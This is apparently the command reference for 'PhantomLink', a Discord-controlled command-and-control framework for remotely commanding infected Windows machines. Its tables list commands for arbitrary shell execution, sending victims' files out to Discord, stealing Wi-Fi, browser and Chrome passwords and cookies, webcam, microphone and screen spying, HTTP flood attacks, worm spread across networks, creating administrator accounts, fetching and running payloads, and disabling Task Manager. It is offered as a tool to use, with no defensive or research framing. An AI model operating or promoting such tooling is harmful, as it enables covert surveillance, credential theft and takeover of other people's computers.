# PhantomLink Quick Commands

This document contains all commands available in the PhantomLink C2 Framework and Discord Bot interface.

> [!NOTE]
> Discord Bot supports native **Discord Slash Commands (`/`)** with auto-complete menus as well as legacy `!` prefix fallback.

---

## Discord Bot Slash Commands (`/`)

When typing `/` in Discord, the command menu will auto-complete with parameter options and descriptions.

| Slash Command | Usage | Description |
| :--- | :--- | :--- |
| **/commands** | `/commands` | Displays the full list of all commands |
| **/clients** | `/clients` | List all connected C2 clients |
| **/select** | `/select <id>` | Select target client ID (or `all`) |
| **/ping** | `/ping` | Test bot connectivity |
| **/cmd** | `/cmd <command>` | Run arbitrary shell command on client |
| **/broadcast** | `/broadcast <command>` | Send command to all connected clients |

---

## Quick Commands Matrix

### File Operations

| Command | Usage | Description |
| :--- | :--- | :--- |
| **/send** | `/send <filepath>` | Send client file to Discord |
| **/get** | `/get <url> <dest_path>` | Download file from URL to client |
| **/copy** | `/copy <src> <dst>` | Copy file or directory |
| **/cut** | `/cut <src> <dst>` | Move file or directory |
| **/extract** | `/extract <archive_path> <dest>` | Extract archive (.zip, .rar, .7z) |
| **/archive** | `/archive <folder_path> <zip_dest>` | Compress folder into .zip |
| **/harvest** | `/harvest <extension>` | Auto-search and extract files by extension (e.g. pdf, docx) |

---

### Media & Surveillance

| Command | Usage | Description |
| :--- | :--- | :--- |
| **/screenshot** | `/screenshot` | Take screenshot and send to Discord/C2 |
| **/camera** | `/camera <device_name>` | Take snapshot from webcam |
| **/record** | `/record <seconds>` | Record audio from microphone |
| **/play** | `/play <audio_path>` | Play audio file on client speaker |
| **/screenrec** | `/screenrec <seconds>` | Record screen video |

---

### Network & Infrastructure

| Command | Usage | Description |
| :--- | :--- | :--- |
| **/wifi** | `/wifi` | Extract saved Wi-Fi profiles & passwords |
| **/netscan** | `/netscan` | Scan local IPv4 subnet for devices |
| **/port** | `/port <port_number>` | Open firewall port |
| **/hosts** | `/hosts block/unblock <domain>` | Block or unblock website in hosts file |
| **/ddos** | `/ddos <target_url> <seconds>` | Send HTTP flood requests to target |
| **/sniff** | `/sniff <seconds>` | Capture network packet trace (.etl) |
| **/worm** | `/worm` | Propagate client payload across local network |

---

### System Info & Credentials

| Command | Usage | Description |
| :--- | :--- | :--- |
| **/info** | `/info` | Gather system OS, CPU, RAM, disk, and hardware specs |
| **/browser** | `/browser` | Extract browser history, logins, and cookies |
| **/chrome_pass** | `/chrome_pass` | Decrypt Chrome saved passwords |
| **/sys** | `/sys` | Detailed hardware and OS information |

---

### System Control & Interaction

| Command | Usage | Description |
| :--- | :--- | :--- |
| **/rotate** | `/rotate up/down/left/right` | Rotate screen orientation |
| **/wallpaper** | `/wallpaper <image_path>` | Change desktop wallpaper |
| **/type** | `/type <text>` | Type text on client keyboard |
| **/alert** | `/alert <message>` | Display popup alert dialog |
| **/block** | `/block <seconds>` | Temporarily block mouse & keyboard input |
| **/spam** | `/spam <count> <message>` | Display popup dialogs repeatedly |
| **/user** | `/user <username> <password>` | Create Windows administrator account |
| **/inject** | `/inject <url>` | Download and execute payload |
| **/logoff** | `/logoff` | Log off current Windows user |
| **/disable_taskmgr** | `/disable_taskmgr` | Disable Task Manager |
| **/enable_taskmgr** | `/enable_taskmgr` | Enable Task Manager |
| **/selfdestruct** | `/selfdestruct` | Remove PhantomLink completely from client |
